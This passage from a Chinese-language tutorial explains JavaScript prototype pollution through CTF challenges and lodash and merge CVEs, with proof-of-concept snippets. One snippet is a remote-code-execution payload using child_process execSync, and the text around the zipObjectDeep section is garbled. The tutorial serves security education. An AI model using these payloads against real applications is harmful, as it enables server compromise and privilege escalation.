            });
        } else {
            res.json({
                "error": "cookie not set"
            })
        }
    });
    app.get('/getFlag', (req, res) => {
        var аdmin = JSON.parse(JSON.stringify(req.cookies))
        if (admin.аdmin == 1) {
            res.send("hackim19{}");
        } else {
            res.send("You are not authorized");
        }
    });
    app.listen(PORT, HOST);
    console.log(`Running on http://${HOST}:${PORT}`);
这里我们可以看出我们需要让admin = 1就行了
要满足`admin.аdmin`等于`1`。因为`__proto__`是一个Object，会递归进入`merge()`，由于`__proto__`有一对`key-value`，所以会判断`__proto__["admin"]`是否是`Object`，不是就进入`else`，对原型`__proto__["admin"]`赋值为`1`，这就完成了原型链污染的操作。
因此最简单的 Payload 就是：
    {"__proto__": {"admin": 1}
### 一个关于Merge的漏洞：merge.recursiveMerge CVE-2020-28499
此 CVE 影响 2.1.1 以下的 merge 版本
测试代码：
    const merge = require('merge');
    const payload2 = JSON.parse('{"x": {"__proto__":{"polluted":"yes"}}}');
    let obj1 = {x: {y:1}};
    console.log("Before : " + obj1.polluted);
    merge.recursive(obj1, payload2);
    console.log("After : " + obj1.polluted);
    console.log("After : " + {}.polluted);
结果如下
漏洞成因
首先对于传入的数据没有严格的审核
导致了recursive方法中的键值是可以控制的，我们可以直接通过他来对原型进行更改
修复也自然就是对传入的数据进行过滤
## Lodash 模块原型链污染
Lodash 是一个 JavaScript 库，包含简化字符串、数字、数组、函数和对象编程的工具，可以帮助程序员更有效地编写和维护 JavaScript
代码。并且是一个流行的 npm 库，仅在GitHub 上就有超过 400 万个项目使用，Lodash的普及率非常高，每月的下载量超过 8000
万次。但是这个库中有几个严重的原型污染漏洞。
### 一个关于Lodash的漏洞：lodash.defaultsDeep 方法 CVE-2019-10744
2019 年 7 月 2 日，Snyk 发布了一个高严重性原型污染安全漏洞（CVE-2019-10744），影响了小于 4.17.12 的所有版本的
lodash。
Lodash 库中的 defaultsDeep 函数可能会被包含 constructor 的 Payload 诱骗添加或修改Object.prototype
。最终可能导致 Web 应用程序崩溃或改变其行为，具体取决于受影响的用例。以下是 Snyk 给出的此漏洞验证 POC：
    const mergeFn = require('lodash').defaultsDeep;
    const payload = '{"constructor": {"prototype": {"whoami": "Vulnerable"}}}'
    function check() {
        mergeFn({}, JSON.parse(payload));
        if (({})[`a0`] === true) {
            console.log(`Vulnerable to Prototype Pollution via ${payload}`);
        }
      }
    check();
    console.log(Object.whoami);
我们在`mergeFn({}, JSON.parse(payload));`处下断点，单步结束后可以看到：
成功在类型为 Object 的 a 对象的 `__proto__` 属性中添加了一个 `whoami` 属性，值为 `Vulnerable`，污染成功。
原型被污染了
在 lodash.merge 方法造成的原型链污染中，为了实现代码执行，我们常常会污染 `sourceURL` 属性，即给所有 Object
对象中都插入一个 `sourceURL` 属性，然后通过 lodash.template 方法中的拼接实现任意代码执行漏洞。后面会讲到。
### lodash.merge 方法造成的原型链污染
Lodash.merge 作为 lodash 中的对象合并插件，他可以 **递归** 合并 `sources` 来源对象自身和继承的可枚举属性到
`object` 目标对象，以创建父映射对象：
    merge(object, sources)
这种格式的东西在原型链污染中是出现频率很高的危险函数之一
这里当两个键相同的时候，生成的对象将有最右边的值，在这里也就是sources的值。当有多个对象相同的时候，那么新生成的对象将只有一个与这些对象相对应的键和值。这也就是之前在Merge类污染的时候讲过的递归那一块，其实和之前说的Merge类污染是很相似的，我们来看源码。
  * node_modules/lodash/merge.js
直接调用了`baseMerge`方法，我们直接跟进
  * node_modules/lodash/_baseMerge.js
这里对srcValue有一个筛选，如果他是一个对象的话就进入`baseMergeDeep`方法，我们要去Merge的对象一定是个Object
  * node_modules/lodash/_baseMergeDeep.js
这里对于上一步的srcValue直接丢进了`assignMergeValue`中，继续跟进
  * node_modules/lodash/_assignMergeValue.js：
这里对value的值和对象键名啥的进行一个筛选，但是最终就是进入`baseAssignValue`
  * node_modules/lodash/_baseAssignValue.js
这里可以进行绕过
    prefixPayload = { nickname: "Will1am" };
    payload：{"constructor": {"prototype": {"role": "admin"}}}
    _.merge(prefixPayload, payload);
最终进入 `object[key] = value` 的赋值操作。
也就是object[prototype] = {"role": "admin"}
这样就给原型对象赋值了一个名为role，值为admin的属性
POC：
    var lodash= require('lodash');
    var payload = '{"__proto__":{"polluted":"yes"}}';
    var a = {};
    console.log("Before polluted: " + a.polluted);
    lodash.merge({}, JSON.parse(payload));
    console.log("After polluted: " + a.polluted);
我们在 `lodash.merge({}, JSON.parse(payload));` 处下断点，单步结束后可以看到：
成功在类型为 Object 的 a 对象的 `__proto__` 属性中添加了一个 `polluted` 属性，值为 `yes`，污染成功。
运行结果也表示了污染成功
### lodash.mergeWith 方法 CVE-2018-16487
这个方法类似于 `merge` 方法。但是它还会接受一个 `customizer`，以决定如何进行合并。 如果 `customizer` 返回
`undefined` 将会由合并处理方法代替。
    mergeWith(object, sources, [customizer])
这个方法在4.0.0版本之后添加的
这个方法除了多了个customizer其实和上面分析的路径是一样的，就不一步一步的卸载这里了
这个参数对于我们的利用路径也没啥影响
    var lodash= require('lodash');
    var payload = '{"__proto__":{"polluted":"yes"}}';
    var a = {};
    console.log("Before polluted: " + a.polluted);
    lodash.merge({}, JSON.parse(payload));
    console.log("After polluted: " + a.polluted);
我们在 `lodash.mergeWith({}, JSON.parse(payload));` 处下断点，单步结束后可以看到：
成功在类型为 Object 的 a 对象的 `__proto__` 属性中添加了一个 `polluted` 属性，值为 `yes`，污染成功。
### lodash.set 方法造成的原型链污染
设置`object`对象中对应 path 属性路径上的值，如果path不存在，则创建。 缺少的索引属性会创建为数组， **而缺少的属性会创建为对象** 。
使用 **_.setWith** 定制path创建。
> Note: 这个方法会改变 object。
    set(object, path, value)
  1. object (Object): 要修改的对象。
  2. path (Array|string): 要设置的对象路径。
  3. value (*): 要设置的值。
返回(Object): 返回 object。
例子
    var object = { 'a': [{ 'b': { 'c': 3 } }] };
     _.set(object, 'a[0].b.c', 4);
    console.log(object.a[0].b.c);
    // => 4 
    _.set(object, ['x', '0', 'y', 'z'], 5);
    console.log(object.x[0].y.z);
    // => 5
其实作用就是修改指定路径的值
看源码
这里指向了baseSet，跟进
这里必然是一个对象，进入if循环，但我们更改的主要是路径，通过路径对原型链进行污染
跟进baseToPath方法
这里对我们传入的path进行一个条件运算，很显然我们传入的一般不是一个数组，跟进到stringToPath方法
可以看到也没有啥过滤
如果没有对传入的参数进行过滤，则可能会造成原型链污染。下面给出一个验证漏洞的 POC：
    var lodash= require('lodash');
    var object_1 = { 'a': [{ 'b': { 'c': 3 } }] };
    var object_2 = {}
    console.log(object_1.whoami);
    //lodash.set(object_2, 'object_2["__proto__"]["whoami"]', 'Vulnerable');
    lodash.set(object_2, '__proto__.["whoami"]', 'Vulnerable');
    console.log(object_1.whoami);
我们在 `lodash.set(object_2, '__proto__.["whoami"]', 'Vulnerable');`
处下断点，单步结束后可以看到：
在类型为 Array 的 object_1 对象的 `__proto__` 属性中出现了一个 `whoami` 属性，值为
`Vulnerable`，污染成功。
### lodash.setWith 方法造成的原型链污染
这个也是，类似于上面讲的set方法，但是还回接受一个`customizer`，用来调用并决定如何设置对象路径的值。 如果 `customizer` 返回
`undefined` 将会有它的处理方法代替。`customizer` 调用3个参数： _(nsValue, key, nsObject)_ 。
该方法与 `set` 方法一样可以进行原型链污染，基本上差不多，就不单出拿出分析了，下面给出一个验证漏洞的 POC：
    var lodash= require('lodash');
    var object_1 = { 'a': [{ 'b': { 'c': 3 } }] };
    var object_2 = {}
    console.log(object_1.whoami);
    //lodash.setWith(object_2, 'object_2["__proto__"]["whoami"]', 'Vulnerable');
    lodash.setWith(object_2, '__proto__.["whoami"]', 'Vulnerable');
    console.log(object_1.whoami);
我们在 `lodash.setWith(object_2, '__proto__.["whoami"]', 'Vulnerable');`
处下断点，单步结束后可以看到：
在类型为 Array 的 object_1 对象的 `__proto__` 属性中出现了一个 `whoami` 属性，值为
`Vulnerable`，污染成功。
### lodash.zipObjectDeep 方法 CVE-2020-8203
例子
    _.zipObjectDeep(['a.b[0].c', 'a.b[1].d'], [1, 2]);
    // => { 'a': { 'b': [{ 'c': 1 }, { 'd': 2 }] } }
影响版本  {return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()//"}
#### [Code-Breaking 2018] Thejs
这道题是看P神文章里面写的，摘出来分析一下
没找到环境，简单分一下吧
源码如下
    const fs = require('fs')
    const express = require('express')
    const bodyParser = require('body-parser')
    const lodash = require('lodash')
    const session = require('express-session')
    const randomize = require('randomatic')
    const app = express()
    app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())
    app.use('/static', express.static('static'))
    app.use(session({
        name: 'thejs.session',
        secret: randomize('aA0', 16),
        resave: false,
        saveUninitialized: false
    }))
    app.engine('ejs', function (filePath, options, callback) { // define the template engine
        fs.readFile(filePath, (err, content) => {
            if (err) return callback(new Error(err))
            let compiled = lodash.template(content)
            let rendered = compiled({...options})